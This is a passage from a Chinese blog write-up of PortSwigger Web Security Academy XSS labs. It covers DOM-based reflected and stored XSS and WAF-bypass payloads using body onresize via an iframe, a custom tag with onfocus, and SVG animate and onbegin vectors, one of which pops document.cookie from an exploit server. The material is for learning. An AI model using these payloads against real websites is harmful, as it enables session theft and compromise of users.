class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$on angular的监听器</span></span><br><span class="line"><span class="comment">$on.constructor 获取 Function方法</span></span><br><span class="line"><span class="comment">(&#x27;alert(1)&#x27;)() 执行alert(1)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250728114641923.png" class="" title="image-20250728114641923"><h3 id="反射型-DOM-XSS漏洞"><a href="#反射型-DOM-XSS漏洞" class="headerlink" title="反射型 DOM XSS漏洞"></a>反射型 DOM XSS漏洞</h3><h4 id="实验要求：-7"><a href="#实验要求：-7" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验演示了一种反射型DOM漏洞。当服务器端应用程序处理来自请求的数据并在响应中回显这些数据时，就会出现反射型DOM漏洞。页面上的脚本随后以不安全的方式处理这些被反射的数据，最终将其写入危险的接收器（dangerous sink）。</p><p>要解决该实验，需构造一个能调用alert()函数的注入攻击。</p><h4 id="实验过程：-7"><a href="#实验过程：-7" class="headerlink" title="实验过程："></a>实验过程：</h4><p>首页有一个搜索页面：</p><img src="/XSS/XSS/image-20250729092941883.png" class="" title="image-20250729092941883"><p>输入内容123.</p><img src="/XSS/XSS/image-20250729093020885.png" class="" title="image-20250729093020885"><p>按f12，打开开发者工具，进入源码位置。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;/resources/js/searchResults.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入了一个searchResults.js脚本 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">search</span>(<span class="string">&#x27;search-results&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 调用了search函数 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;blog-header&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">search</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">/</span> <span class="attr">method</span>=<span class="string">GET</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">placeholder</span>=<span class="string">&#x27;Search the blog...&#x27;</span> <span class="attr">name</span>=<span class="string">search</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">class</span>=<span class="string">button</span>&gt;</span>Search<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure><p>跟进searchResults.js脚本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">path</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); <span class="comment">// 创建XMLHttpRequest对象</span></span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="built_in">eval</span>(<span class="string">&#x27;var searchResultsObj = &#x27;</span> + <span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">            <span class="title function_">displaySearchResults</span>(searchResultsObj);</span><br><span class="line">        &#125; <span class="comment">// 定义了一个回调函数</span></span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, path + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>); <span class="comment">// 初始化请求</span></span><br><span class="line">    xhr.<span class="title function_">send</span>(); <span class="comment">// 发送数据</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>path: search-results 相对路径。</p><p>我们是在：<code>https://0a8e0086032fb0aa818e0dda00830017.web-security-academy.net/</code>发送请求的。</p><p>send发送数据，访问的是<code>https://0a8e0086032fb0aa818e0dda00830017.web-security-academy.net/search-results?search=123</code></p><p>我们访问一下，返回如下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;123&quot;&#125;</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250729094620108.png" class="" title="image-20250729094620108"><p>xhr.responseText 返回：<code>&#39;&#123;&quot;results&quot;:[],&quot;searchTerm&quot;:&quot;123&quot;&#125;&#39;</code>。</p><p>这是漏洞点：<code>eval(&#39;var searchResultsObj = &#39; + this.responseText);</code></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#125;; alert(&#x27;XSS&#x27;)//</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250729095151425.png" class="" title="image-20250729095151425"><p>对我们恶意闭合的双引号进行了转义，那我们再输入一个转义符号，让转义符号转义他自己。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;&#125;; alert(&#x27;XSS&#x27;);//</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250729095350905.png" class="" title="image-20250729095350905"><img src="/XSS/XSS/image-20250729095414229.png" class="" title="image-20250729095414229"><h3 id="存储型-DOM-XSS漏洞"><a href="#存储型-DOM-XSS漏洞" class="headerlink" title="存储型 DOM XSS漏洞"></a>存储型 DOM XSS漏洞</h3><h4 id="实验要求：-8"><a href="#实验要求：-8" class="headerlink" title="实验要求："></a>实验要求：</h4><p>该实验演示了博客评论功能中的一个存储型DOM漏洞。要完成实验，请利用此漏洞触发<code>alert()</code>函数。</p><h4 id="实验过程：-8"><a href="#实验过程：-8" class="headerlink" title="实验过程："></a>实验过程：</h4><p>实验要求告诉我们博客评论功能存在储存型DOM漏洞。</p><p>我们进入博客，进入一篇文章，按f12，进入源码，找到评论提交位置：</p><img src="/XSS/XSS/image-20250729135925123.png" class="" title="image-20250729135925123"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/post/comment&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;XgRrRnk7KxSKyQDQMNY5fdag6SUrZ7vp&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;postId&quot;</span> <span class="attr">value</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Comment:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">required</span> <span class="attr">rows</span>=<span class="string">&quot;12&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;300&quot;</span> <span class="attr">name</span>=<span class="string">&quot;comment&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Email:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">required</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Website:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">pattern</span>=<span class="string">&quot;(http:|https:).+&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;website&quot;</span>&gt;</span>  <span class="comment">&lt;!-- 前端有一个正则表达式 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;button&quot;</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Post Comment<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Ctrl+F，搜索<code>script</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;/resources/js/loadCommentsWithVulnerableEscapeHtml.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">loadComments</span>(<span class="string">&#x27;/post/comment&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>58、59行；调用了一个函数loadComments，跟进loadCommentsWithVulnerableEscapeHtml.js脚本：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">loadComments</span>(<span class="params">postCommentPath</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();  </span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> comments = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>); <span class="comment">// 用JSON.parse可以修复上一题的漏洞</span></span><br><span class="line">            <span class="title function_">displayComments</span>(comments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, postCommentPath + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>);</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line"><span class="comment">// 上面这些内容没啥好说的。</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">escapeHTML</span>(<span class="params">html</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> html.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>); <span class="comment">// 这个有一个特性，我不知道的特性，就因为我不知道，导致这道题没有做出来，后面说。我先说说我当时的思路</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">displayComments</span>(<span class="params">comments</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> userComments = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;user-comments&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; comments.<span class="property">length</span>; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            comment = comments[i];</span><br><span class="line">            <span class="keyword">let</span> commentSection = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;section&quot;</span>);</span><br><span class="line">            commentSection.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;comment&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> firstPElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">let</span> avatarImgElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);</span><br><span class="line">            avatarImgElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;class&quot;</span>, <span class="string">&quot;avatar&quot;</span>);</span><br><span class="line">            avatarImgElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, comment.<span class="property">avatar</span> ? <span class="title function_">escapeHTML</span>(comment.<span class="property">avatar</span>) : <span class="string">&quot;/resources/images/avatarDefault.svg&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (comment.<span class="property">author</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (comment.<span class="property">website</span>) &#123;</span><br><span class="line">                    <span class="keyword">let</span> websiteElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">                    websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;id&quot;</span>, <span class="string">&quot;author&quot;</span>);</span><br><span class="line">                    websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, comment.<span class="property">website</span>); <span class="comment">// 当时我看到这里没有做任何处理，我以为漏洞在这里。</span></span><br><span class="line">                    firstPElement.<span class="title function_">appendChild</span>(websiteElement)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">let</span> newInnerHtml = firstPElement.<span class="property">innerHTML</span> + <span class="title function_">escapeHTML</span>(comment.<span class="property">author</span>)</span><br><span class="line">                firstPElement.<span class="property">innerHTML</span> = newInnerHtml  <span class="comment">// 这里将a标签放进p标签里。</span></span><br><span class="line">            &#125;</span><br><span class="line"><span class="comment">// ......</span></span><br></pre></td></tr></table></figure><p>a 标签的href属性可以利用  javascript 伪协议 来执行代码。正则在前端，我将<code>pattern=&quot;(http:|https:).+&quot;</code>，修改为<code>pattern=&quot;(http:|https:|javascript:).+&quot;</code>，接着输入内容：</p><img src="/XSS/XSS/image-20250729141738758.png" class="" title="image-20250729141738758"><img src="/XSS/XSS/image-20250729141829147.png" class="" title="image-20250729141829147"><p>它后端还会识别网站，我输入<code>http://example.com</code>可以，说明必须以<code>http:</code>或<code>https:</code>开头。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">websiteElement.<span class="title function_">setAttribute</span>(<span class="string">&quot;href&quot;</span>, comment.<span class="property">website</span>);</span><br></pre></td></tr></table></figure><p>我试过恶意闭合双引号等办法，都已失败告终。</p><p>现在看看正确的解题方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.<span class="title function_">replace</span>(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).<span class="title function_">replace</span>(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>); <span class="comment">// 如果html是字符串时，replace只会替换一次。</span></span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250729143741564.png" class="" title="image-20250729143741564"><img src="/XSS/XSS/image-20250729143716823.png" class="" title="image-20250729143716823"><p><code>&lt;/h2&gt;</code>被解析了，所以我们看不到，当我们输入: <code>&lt;h2&gt;&lt;h2&gt;hello&lt;/h2&gt;</code>:</p><img src="/XSS/XSS/image-20250729143915705.png" class="" title="image-20250729143915705"><p>第一个&lt;&gt;被替换，导致我们后面的可以被解析成功，我们可以看到。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;&lt;img src=1 onerror=alert(1) /&gt;</span><br></pre></td></tr></table></figure><img src="/XSS/XSS/image-20250729144419379.png" class="" title="image-20250729144419379"><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (comment.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> commentBodyPElement = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;p&quot;</span>);</span><br><span class="line">    commentBodyPElement.<span class="property">innerHTML</span> = <span class="title function_">escapeHTML</span>(comment.<span class="property">body</span>);  <span class="comment">// 我们从这里写入恶意代码。</span></span><br><span class="line"></span><br><span class="line">    commentSection.<span class="title function_">appendChild</span>(commentBodyPElement);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>做到这里，感觉有一些虚浮了，后面学习的时候要总结总结了。总结这些漏洞到底是由啥引起的，做到这里，我都忘记了有些漏洞到底是有啥引起的。</p></blockquote><h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><h3 id="HTML标签之间的XSS攻击"><a href="#HTML标签之间的XSS攻击" class="headerlink" title="HTML标签之间的XSS攻击"></a>HTML标签之间的XSS攻击</h3><h4 id="大多数标签和属性被禁止的反射型XSS攻击"><a href="#大多数标签和属性被禁止的反射型XSS攻击" class="headerlink" title="大多数标签和属性被禁止的反射型XSS攻击"></a>大多数标签和属性被禁止的反射型XSS攻击</h4><h5 id="实验要求-1"><a href="#实验要求-1" class="headerlink" title="实验要求"></a>实验要求</h5><p>该实验在搜索功能中存在一个反射型XSS（跨站脚本）漏洞，但使用了Web应用防火墙(WAF)来防御常见的XSS攻击向量。</p><p>实验目标是：构造一个能够绕过WAF防护并成功调用print()函数的跨站脚本攻击。</p><p>重要说明：<br>您的解决方案必须无需任何用户交互。在您自己的浏览器中手动调用print()函数将无法完成实验。</p><h5 id="实验过程-1"><a href="#实验过程-1" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验告诉我们搜索功能这里存在反射型XSS漏洞。</p><p>我在这里测试了好几个标签，如：<code>a、input、button、img、script</code>，这些都被过滤了。</p><p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a></p><p>打开代理，打开yakit，启用交互式劫持，输入<code>&lt;&gt;</code>。</p><p>进入Web Fuzzer。</p><img src="/XSS/XSS/image-20250730100152059.png" class="" title="image-20250730100152059"><p>复制tags标签。</p><img src="/XSS/XSS/image-20250730095938675.png" class="" title="image-20250730095938675"><p>插入到临时字典。</p><img src="/XSS/XSS/image-20250730100257643.png" class="" title="image-20250730100257643"><p>发送请求。</p><img src="/XSS/XSS/image-20250730100526491.png" class="" title="image-20250730100526491"><p>body标签可用，输入<code>&lt;body onload=alert()&gt;</code></p><img src="/XSS/XSS/image-20250730100628951.png" class="" title="image-20250730100628951"><p>onload属性也被禁止了，复制events事件，插入到临时字典，发起请求。</p><img src="/XSS/XSS/image-20250730100912245.png" class="" title="image-20250730100912245"><p>里面有一个onresize事件，属性没有禁止，如何触发onresize事件，当修改窗口大小时，会触发。</p><img src="/XSS/XSS/image-20250730101221902.png" class="" title="image-20250730101221902"><p>题目要求:您的解决方案必须无需任何用户交互。在您自己的浏览器中手动调用print()函数将无法完成实验。</p><p>进入服务器，在body输入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&#x27;https://0a0900ba03d4a87980091c2a00890047.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29+%3E&#x27;</span> <span class="attr">onload</span>=<span class="string">&#x27;this.style.height=300&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>储存后，将其发给受害者，在加载完成后，触发onload事件，修改了高度，触发onresize事件，执行print()函数。</p><blockquote><p>此题是后端的waf。</p></blockquote><h4 id="禁止了所有除自制标签以外的所有标签的XSS攻击"><a href="#禁止了所有除自制标签以外的所有标签的XSS攻击" class="headerlink" title="禁止了所有除自制标签以外的所有标签的XSS攻击"></a>禁止了所有除自制标签以外的所有标签的XSS攻击</h4><h5 id="实验要求-2"><a href="#实验要求-2" class="headerlink" title="实验要求"></a>实验要求</h5><p>这个实验会屏蔽所有 HTML 标签，只允许自定义标签。</p><p>要解决这个实验，需要实施一次跨站脚本攻击，注入一个自定义标签，并自动弹出<code>document.cookie</code>（文档的 Cookie 信息）。</p><h5 id="实验过程-2"><a href="#实验过程-2" class="headerlink" title="实验过程"></a>实验过程</h5><p>搜索界面存在XSS漏洞，实验告诉我们屏蔽了所有HTML标签，只允许自制标签。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?search=&lt;xss id=&#x27;xss&#x27; onfocus=alert(1) tabindex=1 &gt;#xss</span><br></pre></td></tr></table></figure><p>tabindex属性赋予xss标签能够被聚焦的能力，1表示第一个被触发。</p><p>onfocus事件：当元素获得聚焦时触发。</p><p>id&#x3D;’xxx’ 给xss标签赋予id。</p><p>#xss  让页面滚动到id&#x3D;’xss’的元素，间接触发元素的聚焦行为。</p><p>这个过程还需要手动去触发。</p><img src="/XSS/XSS/image-20250730115204233.png" class="" title="image-20250730115204233"><p>但是当我们将其保存到服务器，将1换为document.cookie：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">window.location=&#x27;https://0ab200d303fc4ab380cd9e1200f500a0.web-security-academy.net/?search=%3Cxss%20id=%27xss%27%20onfocus=alert(document.cookie)%20tabindex=1%20%3E#xss&#x27;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>我们将其保存在<a href="https://exploit-0a8d009203e74a8080659d5b01dd0002.exploit-server.net/exploit%E9%A1%B5%E9%9D%A2%E3%80%82">https://exploit-0a8d009203e74a8080659d5b01dd0002.exploit-server.net/exploit页面。</a></p><p>将这个网址发送给受害者就会触发xss漏洞。</p><p>我们要完成此实验：</p><img src="/XSS/XSS/image-20250730115837685.png" class="" title="image-20250730115837685"><p>要点击Deliver exploit to victim。</p><h4 id="所有事件和-href-属性均被阻止的反射型-XSS"><a href="#所有事件和-href-属性均被阻止的反射型-XSS" class="headerlink" title="所有事件和 href 属性均被阻止的反射型 XSS"></a>所有事件和 href 属性均被阻止的反射型 XSS</h4><h5 id="实验要求-3"><a href="#实验要求-3" class="headerlink" title="实验要求"></a>实验要求</h5><p>这个实验包含一个反射型 XSS 漏洞，同时存在一些白名单标签，但所有事件和锚点的 href 属性都被屏蔽了。</p><p>要解决这个实验，需要执行一次跨站脚本攻击，注入一个向量，当该向量被点击时，会调用 alert 函数。</p><p>请注意，你需要在向量中包含 “Click” 这个词，以促使实验中的模拟用户点击你的向量。例如：</p><p><code>&lt;a href=&quot;&quot;&gt;Click me&lt;/a&gt;</code></p><h5 id="实验过程-3"><a href="#实验过程-3" class="headerlink" title="实验过程"></a>实验过程</h5><p>实验告诉我们存在白名单标签，我们通过<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a>的标签字典测试一下。</p><img src="/XSS/XSS/image-20250731090453332.png" class="" title="image-20250731090453332"><p>animate a svg title image 这些标签没有被禁止。</p><p>实验要求还告诉我们，所有事件和描点的href属性被屏蔽。</p><p>svg标签：向html页面嵌入一个独立的窗口和坐标体系。</p><p>animate标签：用于动态设置SVG元素的属性值。</p><p>a标签：svg的描元素，用于定义超链接。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">values</span>=<span class="string">javascript:alert(1)</span> &gt;</span><span class="tag">&lt;/<span class="name">animate</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">10</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>attributeName：要更改的属性名称，values：要更改的值的内容。</p><p>text标签：svg的矢量文本元素，用于绘制文本。</p><p>此payload动态调整a标签的href属性，让其为javascript:伪协议，当我们点击文本后，就会执行javascript代码。</p><img src="/XSS/XSS/image-20250731092804292.png" class="" title="image-20250731092804292"><p>点击Click me 即可完成实验（不点击，好像也可以完成实验）。</p><h4 id="允许部分SVG标记的反射型XSS"><a href="#允许部分SVG标记的反射型XSS" class="headerlink" title="允许部分SVG标记的反射型XSS"></a>允许部分SVG标记的反射型XSS</h4><h5 id="实验要求-4"><a href="#实验要求-4" class="headerlink" title="实验要求"></a>实验要求</h5><p>这个安全实验室存在一个简单的反射型XSS漏洞。网站虽然屏蔽了常见HTML标签，但遗漏了某些SVG标签和事件。</p><p>要完成实验，请构造一个跨站脚本攻击，成功调用alert()函数。</p><h5 id="实验过程-4"><a href="#实验过程-4" class="headerlink" title="实验过程"></a>实验过程</h5><p>网站屏蔽了常见的HTML标签，我们通过<a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS payload 备忘录</a>的tag进行爆破，发现：</p><img src="/XSS/XSS/image-20250731102123243.png" class="" title="image-20250731102123243"><p>只有这些标签可以用。</p><p>爆破事件属性：</p><img src="/XSS/XSS/image-20250731103646914.png" class="" title="image-20250731103646914"><p>onbegin事件属性可以利用，其仅限于SVG动画元素。</p><p>onbegin事件在动画开始播放时执行脚本。通常用于以下SVG动画元素：<code>animate animateTransform animateMotion set</code> ，</p><p>payload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animateTransform</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> &gt;</span><span class="tag">&lt;/<span class="name">animateTransform</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><img 